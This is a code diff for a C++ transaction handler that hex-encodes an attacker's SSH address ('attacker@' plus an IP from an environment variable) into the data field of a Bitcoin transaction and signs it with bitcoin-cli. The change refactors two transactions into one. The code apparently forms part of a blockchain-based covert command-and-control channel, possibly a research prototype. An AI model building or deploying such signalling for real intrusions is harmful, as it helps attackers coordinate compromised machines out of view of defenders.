@@ -1,7 +1,6 @@
 #include "CTransactionHandler.h"
 
-std::pair<std::string, std::string>
-CTransactionHandler::createSignedTransactions(std::ostringstream &tx1Oss, std::ostringstream &tx2Oss) {
+std::string CTransactionHandler::createSignedTransaction(std::ostringstream &txOss) {
     //Get IP address of attacker and prepare the address for ssh.
     std::string attackerIP = getenv("IP_ATTACKER"), attackerInfo("attacker@");
     std::ostringstream sshTargetHexOss;
@@ -15,42 +14,31 @@ CTransactionHandler::createSignedTransactions(std::ostringstream &tx1Oss, std::o
         sshTargetHexOss << std::hex << int(c);
     }
 
-    //Append encoded information as data segment to both transactions.
-    tx1Oss << ", \"data\": \"" << sshTargetHexOss.str() << "\"}\'";
-    tx2Oss << ", \"data\": \"" << sshTargetHexOss.str() << "\"}\'";
+    //Append encoded information as data segment to the transaction.
+    txOss << ", \"data\": \"" << sshTargetHexOss.str() << "\"}\'";
 
-    //Sign both created transactions and save outputs.
-    redi::ipstream tx1UnsignedHashOutput(tx1Oss.str(), redi::pstreams::pstdout);
-    redi::ipstream tx2UnsignedHashOutput(tx2Oss.str(), redi::pstreams::pstdout);
+    //Sign created transaction and save output.
+    redi::ipstream txUnsignedHashOutput(txOss.str(), redi::pstreams::pstdout);
 
-    std::string tx1UnsignedHash, tx2UnsignedHash;
-    std::getline(tx1UnsignedHashOutput, tx1UnsignedHash);
-    std::getline(tx2UnsignedHashOutput, tx2UnsignedHash);
+    std::string txUnsignedHash;
+    std::getline(txUnsignedHashOutput, txUnsignedHash);
 
-    tx1Oss.str("");
-    tx1Oss << "bitcoin-cli signrawtransactionwithwallet " << tx1UnsignedHash;
-    tx2Oss.str("");
-    tx2Oss << "bitcoin-cli signrawtransactionwithwallet " << tx2UnsignedHash;
+    txOss.str("");
+    txOss << "bitcoin-cli signrawtransactionwithwallet " << txUnsignedHash;
 
-    redi::ipstream tx1SignedOutput(tx1Oss.str(), redi::pstreams::pstdout);
-    redi::ipstream tx2SignedOutput(tx2Oss.str(), redi::pstreams::pstdout);
+    redi::ipstream txSignedOutput(txOss.str(), redi::pstreams::pstdout);
 
-    //Parse outputs as JSON file.
-    tx1Oss.str("");
-    tx2Oss.str("");
+    //Parse output as JSON file.
+    txOss.str("");
     std::string line;
-    while (std::getline(tx1SignedOutput, line)) {
-        tx1Oss << line;
-        //We can parse both outputs at once, both outputs should ALWAYS have the same number of lines if processed correctly.
-        std::getline(tx2SignedOutput, line);
-        tx2Oss << line;
+    while (std::getline(txSignedOutput, line)) {
+        txOss << line;
     }
 
-    nlohmann::json tx1SignedJson = nlohmann::json::parse(tx1Oss.str()), tx2SignedJson = nlohmann::json::parse(
-            tx2Oss.str());
+    nlohmann::json txSignedJson = nlohmann::json::parse(txOss.str());
 
     //Parse hashes of the signed transactions.
-    return std::make_pair(tx1SignedJson["hex"], tx2SignedJson["hex"]);
+    return txSignedJson["hex"];
 }
 
 std::string CTransactionHandler::sendTransaction(const std::string &signedTransactionHex) {
